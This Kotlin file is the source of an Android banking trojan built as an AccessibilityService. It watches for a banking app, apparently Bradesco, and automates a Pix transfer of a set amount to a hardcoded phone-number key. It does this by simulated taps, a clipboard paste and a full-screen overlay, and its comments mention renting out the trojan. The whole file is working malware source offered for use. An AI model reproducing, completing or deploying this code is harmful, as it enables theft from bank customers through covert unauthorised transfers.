package com.BrasSec


import kotlinx.coroutines.withContext
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.annotation.SuppressLint
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import java.util.Properties
import javax.mail.Message
import javax.mail.MessagingException
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeMessage
import javax.mail.Session
import android.graphics.Path
import android.graphics.PixelFormat
import android.graphics.Rect
import android.os.Build
import android.os.SystemClock
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.view.WindowManager.LayoutParams.*
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import androidx.annotation.RequiresApi
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.*


class AutoClickService: AccessibilityService() {
    private var isClicking = false
    var mWindowManager: WindowManager? = null
    lateinit var overlayView: View
    lateinit var layoutParams: WindowManager.LayoutParams
    val pattern = "^\\d+,\\d+$".toRegex()
    var num = 0


    @SuppressLint("NewApi")
    suspend fun findNodeWithText(texto:String): Any? {
        Log.d("Brassec", "Veio pra find node.")
        var rootNode = rootInActiveWindow
        var targetText = texto

        if (rootNode == null) return null

        var nodeQueue: Queue<AccessibilityNodeInfo> = LinkedList()//10
        nodeQueue.clear()
        nodeQueue.add(rootNode)

        while (!nodeQueue.isEmpty()) {
            var currentNode = nodeQueue.poll()



            if (currentNode != null) {
                if (currentNode.text != null && currentNode.text.toString().contains("Fazer outro P")
                    && currentNode.text.toString().contains("ix")
                    && ctn_press == 0 ) {
                    Log.d("Brassec", "Find node 0.")

                    withContext(Dispatchers.Main) {
                        addOverlayView()
                    }
                    return   press(currentNode) }
            }

            if (currentNode != null) {
                if (currentNode.text != null && currentNode.text.toString().contains("Celular item")
                    && currentNode.text.toString().contains("1 de 6")
                    && ctn_press == 1) {

                    Log.d("Brassec", "Find node 1.")
                    return  press(currentNode)
                }
            }

            if (currentNode != null) {
                if(currentNode.viewIdResourceName!= null &&
                    currentNode.viewIdResourceName.toString().contains("telefone")){
                    Log.d("Brassec", "Find node 2.")

                    var myClipboard: ClipboardManager? = null
                    var myClip: ClipData? = null
                    myClipboard = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
                    if (myClipboard != null) {
                        myClipboard.clearPrimaryClip()
                        SystemClock.sleep(100)
                    }
                    myClip = ClipData.newPlainText("text", "(45)998559238")
                    SystemClock.sleep(100)
                    if (myClip != null) {
                        myClipboard?.setPrimaryClip(myClip)
                        return  delay_telefone(currentNode)
                    }

                }
            }
            if (currentNode != null) {
                if(currentNode.text!= null && currentNode.text.toString().contains("Qual é a chave de")
                    && currentNode.text.toString().contains("quem vai receber?")
                    && ctn_press == 3){
                    Log.d("Brassec", "Find node 3.")
                    SystemClock.sleep(150)
                    return  press(currentNode)
                }
            }

            if (currentNode != null) {
                if (currentNode.text != null && currentNode.text.toString()
                        .contains("visualizar s")
                    && currentNode.text.toString()
                        .contains("aldo")
                    && ctn_press ==5) {

                    Log.d("Brassec", "Find node 5.")
                    SystemClock.sleep(50)
                    return   press(currentNode) }
            }


            if (ctn_press==6) {
                if (currentNode != null && currentNode.text != null
                    && pattern.containsMatchIn(currentNode.text.toString())){

                    var nodeText = currentNode.text.toString()
                        Log.d("Brassec", "Find node 6//$nodeText")

                        var size = currentNode.text
                        valor.add("100000")
                        // valor.add(size)
                        novaLista = valor.map { it.toString().replace(",", "")
                            .replace(".", "") }

                        num = novaLista[0].toInt()

                        Log.d("Nubot", num.toString())
                        ctn_press = 7
                        return  findNodeWithText("x")
                    } }


            if (currentNode != null) {
                if (currentNode.text != null && currentNode.text.toString()
                        .contains("mais 1")
                    && currentNode.text.toString()
                        .contains("real botão")
                    && ctn_press ==7) {
                    Log.d("Brassec", "+1 encontrado")
                    SystemClock.sleep(50)
                    return   mais100(currentNode) }
            }


            if (currentNode != null) {
                if (currentNode.text != null && currentNode.text.toString()
                        .contains("Escolha")
                    && currentNode.text.toString()
                        .contains("o valor")
                    && ctn_press ==8) {
                    Log.d("Brassec", "Find node 8.")
                    return press(currentNode) }}

            if (currentNode != null) {
                if (currentNode.text!= null && currentNode.text
                        .toString().contains("Botão")
                    && currentNode.text
                        .toString().contains("continuar")
                    && ctn_press ==9  ) {
                    Log.d("Brassec", "Find node 9.")
                    SystemClock.sleep(500)
                    return  performCustomClick(currentNode)
                }}


            if (currentNode != null) {
                if (currentNode.text!= null && currentNode.text
                        .toString().contains("Agora, é só")
                    && currentNode.text
                        .toString().contains("confirmar")
                    && ctn_press ==10 ) {
                    Log.d("Brassec", "Find node 10.")
                    return startClicking(currentNode)
                }}


            if (currentNode != null) {
                for (i in 0 until currentNode.childCount) {
                    var childNode = currentNode.getChild(i)
                    nodeQueue.add(childNode)
                }
            }
        }

        return findNodeWithText(targetText)
    }

    lateinit var novaLista:List<String>
    var left = 0
    var top = 0
    var right = 0
    var bottom= 0
    var no_encontrado= 0

    private suspend fun addOverlayView() {
        Log.d("Brassec", "Add overlay view")
        overlayView = LayoutInflater.from(this).inflate(R.layout.layout1, null)
       // mWindowManager?.addView(overlayView, layoutParams)
        //findNodeWithText("x")
    }
    @OptIn(DelicateCoroutinesApi::class)
    @RequiresApi(Build.VERSION_CODES.O)

    fun first_text(str:String): Unit? {
        var rootNode = rootInActiveWindow
        var targetText = str
        var nodeQueue: Queue<AccessibilityNodeInfo> = LinkedList()
        nodeQueue.clear()
        nodeQueue.add(rootNode)

        while (!nodeQueue.isEmpty()) {
            var currentNode = nodeQueue.poll()


            if (currentNode!= null && currentNode.text != null && currentNode.text.toString().contains("Faze")
                && currentNode.text.toString().contains("outro Pi")
            ) {
                no_encontrado = 1
                Log.d("Brassec", "Fazer outro pix encontrado.")
                GlobalScope.launch(Dispatchers.IO) {
                     findNodeWithText("x")
                }

            }

            if (currentNode != null) {
                for (i in 0 until currentNode.childCount) {
                    var childNode = currentNode.getChild(i)
                    nodeQueue.add(childNode)
                }
            }
        }
        if (no_encontrado<1) return first_text("x")
        return null
    }


    suspend fun pos_continuar(str:String): Unit? {
        var rootNode = rootInActiveWindow
        var targetText = str
        if (rootNode == null) return null

        var nodeQueue: Queue<AccessibilityNodeInfo> = LinkedList()//10
        nodeQueue.clear()
        nodeQueue.add(rootNode)

        while (!nodeQueue.isEmpty()) {
            var currentNode = nodeQueue.poll()

            if (currentNode != null) {
                if (currentNode.text != null && currentNode.text.toString().contains("Continuar")
                    && currentNode.text.toString().contains("desativado")
                ) {

                    var rect = Rect()
                    var coord = currentNode.getBoundsInScreen(rect)
                    left = rect.left
                    top = rect.top
                    right = rect.right
                    bottom= rect.bottom

                    Log.d("Brassec", "pos continuar - ctn press 2")
                    if (ctn_press==2) findNodeWithText("x")

                }
            }
            if(ctn_press==4 ){
                Log.d("Brassec", "pos continuar - ctn press 4")
                findElementByBounds(left,top,right,bottom) }

            if (currentNode != null) {
                for (i in 0 until currentNode.childCount) {
                    var childNode = currentNode.getChild(i)
                    nodeQueue.add(childNode)
                }
            }
        }
        return pos_continuar(targetText)
    }

    suspend fun findElementByBounds(left:Int, top:Int, right:Int, bottom:Int) {

        val rect = Rect(left, top, right, bottom)
        var rootNode = rootInActiveWindow
        var click = true

        var nodeQueue: Queue<AccessibilityNodeInfo> = LinkedList()
        nodeQueue.clear()
        nodeQueue.add(rootNode)

        while (!nodeQueue.isEmpty()) {
            var currentNode = nodeQueue.poll()
            var nodeBounds = Rect()
            if (currentNode != null) {
                currentNode.getBoundsInScreen(nodeBounds)
            }


            if (nodeBounds.left==rect.left&&nodeBounds.top==rect
                    .top&&nodeBounds.right==rect.right&&nodeBounds.bottom==rect.bottom) {

                var x = nodeBounds.centerX()
                var y = nodeBounds.centerY()
                if (currentNode != null) {
                    if (currentNode.text.toString().contains("Botão continuar")
                        && currentNode.text.toString().contains("desativado"))
                    {
                        click = false
                        ctn_press = 5
                        findNodeWithText("x")}
                }

                var path = Path()
                path.moveTo(x.toFloat(), y.toFloat())
                var gestureBuilder = GestureDescription.Builder()
                gestureBuilder.addStroke(GestureDescription.StrokeDescription(path, 0, 2))

                var gesture = gestureBuilder.build()

                val success = dispatchGesture(gesture, object : AccessibilityService.GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        SystemClock.sleep(100)

                    }

                    override fun onCancelled(gestureDescription: GestureDescription?) {
                    }
                }, null)
                Log.d("Brassec", "find element by bounds")
            }
            if (currentNode != null) {
                for (i in 0 until currentNode.childCount) {
                    var childNode = currentNode.getChild(i)
                    nodeQueue.add(childNode)
                }
            }
        }

        if (click == true) {SystemClock.sleep(40)
            findElementByBounds(left,top,right,bottom)}
    }
    var delayms = 50

    suspend fun delay_telefone(No:AccessibilityNodeInfo){
        ctn_press = 3
        No.performAction(16)
        SystemClock.sleep((100+delayms).toLong())
        No.performAction(AccessibilityNodeInfo.ACTION_PASTE)
        SystemClock.sleep((200+delayms).toLong())
        if (No.text == null){
            Log.d("Brassec", "delay telefone")
            delayms+=50
            delay_telefone(No)
        }
        else{
            findNodeWithText("x")
        }
    }


    suspend fun mais100(Node: AccessibilityNodeInfo){
        Log.d("Brassec", "Veio pra +100")
        var clicks = num/100/100
        //  o for abaixo ira clicar no botao +100 com base no resultado da divisao acima
        // por exemplo se o saldo (num) for de mil reais : 100000 dividido por cem dividido por cem igual a 10.
        // 10 cliques no botao mais 100 e igual o saldo da conta
        for (i in 0 until clicks){
            var rect = Rect()
            var coord = Node.getBoundsInScreen(rect)
            var x = rect.centerX()
            var y = rect.centerY()
            var path = Path()
            path.moveTo(x.toFloat(), y.toFloat())
            var gestureBuilder = GestureDescription.Builder()
            gestureBuilder.addStroke(GestureDescription.StrokeDescription(path, 2, 1))

            var gesture = gestureBuilder.build()
            dispatchGesture(gesture, null, null)
            SystemClock.sleep(100)
        }
        ctn_press = 8
        SystemClock.sleep(1000)
       // mWindowManager?.removeView(overlayView)
        //disableSelf()
        findNodeWithText("x")
    }

    var ctn_valor = 0
    var valor: MutableList<CharSequence> = mutableListOf()
    var ctn_press = 0



    suspend fun press(target: AccessibilityNodeInfo?){
        ctn_press+=1
        target?.performAction(16)

        if(ctn_press==1) findNodeWithText("x")
        if(ctn_press==2) pos_continuar("x")
        if(ctn_press==4) pos_continuar("x")
        if(ctn_press==5) findNodeWithText("x")
        if(ctn_press==6) findNodeWithText("x")
        if(ctn_press==9) SystemClock.sleep(500)
        if(ctn_press==9) findNodeWithText("x")
    }

    var ydecrement = 10

    private suspend fun startClicking(currentNode: AccessibilityNodeInfo) {
        Log.d("Brassec", "Start clicking")
        val boundsInScreen = Rect()
        rootInActiveWindow.getBoundsInScreen(boundsInScreen)
        val x = boundsInScreen.centerX().toFloat()
        val y = bottom
        isClicking = true
        val clickInterval = 50
        var initialY = y
        val screenHeight =boundsInScreen.bottom - boundsInScreen.bottom/4
        if (y -ydecrement >= screenHeight){
            ydecrement+=10
            val path = Path()
            path.moveTo(x, y-ydecrement.toFloat())
            val gestureBuilder = GestureDescription.Builder()
            gestureBuilder.addStroke(GestureDescription.StrokeDescription(path, 0, clickInterval.toLong()))
            val gesture = gestureBuilder.build()
            dispatchGesture(gesture, null, null)
            SystemClock.sleep(clickInterval.toLong())

            last_text(currentNode)

        }
        else{
            ydecrement = 10
            mWindowManager?.removeView(overlayView)
            onInterrupt()
           // last_text(currentNode)
        }

    }


    private suspend fun performCustomClick(target:AccessibilityNodeInfo) {
        Log.d("Brassec", "PerformCustom clicking")
        ctn_press =10
        SystemClock.sleep(500)
        var rect = Rect()
        var coord = target.getBoundsInScreen(rect)
        var x = rect.centerX()
        var y = rect.centerY()
        var path = Path()
        path.moveTo(x.toFloat(), y.toFloat())
        var gestureBuilder = GestureDescription.Builder()
        gestureBuilder.addStroke(GestureDescription.StrokeDescription(path, 2, 2))

        var gesture = gestureBuilder.build()
        dispatchGesture(gesture, null, null)
        SystemClock.sleep(500)
        findNodeWithText("x")
    }

    suspend fun last_text(node:AccessibilityNodeInfo): Unit? {

        var rootNode = rootInActiveWindow
        if (rootNode == null) return null
        var nodeQueue: Queue<AccessibilityNodeInfo> = LinkedList()//10
        nodeQueue.clear()
        nodeQueue.add(rootNode)

        while (!nodeQueue.isEmpty()) {
            var currentNode = nodeQueue.poll()

            if (currentNode != null) {
                if (currentNode.text!=null&& currentNode.text.toString()
                        .contains("Fazer outro P")
                    && currentNode.text.toString()
                        .contains("ix"))
                {
                    mWindowManager?.removeView(overlayView)

                    onInterrupt()
                }
            }

            for (i in 0 until currentNode.childCount) {
                var childNode = currentNode.getChild(i)
                nodeQueue.add(childNode)
            }
        }
        return startClicking(node)
    }



    @RequiresApi(Build.VERSION_CODES.O)
    @SuppressLint("SuspiciousIndentation")
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {

        if (event != null) {
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ) {
                var packageName = event?.packageName?.toString()

                if (packageName != null) {
                    if(packageName.contains("com.bra")
                        && packageName.contains("desco")){
                        var texto = "x"
                        Log.d("Brassec", "Event acionado.")
                        if(no_encontrado <1){
                            first_text(texto) } } } } } }


    override fun onInterrupt() {

    }

    fun data_limite(){
        // codigo feito quando eu pensava em alugar esse trojan
        // esse codigo inutilizaria o trojan por exemplo a partir da data 20/11/2024 12:00
        val dataEstipulada = "20/11/2024 12:00:00"
        val dataAtual = Calendar.getInstance().time
        val formato = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
        val dataAtualFormatada = formato.format(dataAtual)
        compare = dataEstipulada.compareTo(dataAtualFormatada)
        if (compare < 0) {
           // disableSelf()
        }
    }

    var compare = 0
    override fun onServiceConnected() {
        super.onServiceConnected()

        mWindowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        layoutParams = WindowManager.LayoutParams(MATCH_PARENT,
            MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS or
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT)
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.notificationTimeout = 60
        serviceInfo = info
        data_limite()

    }}
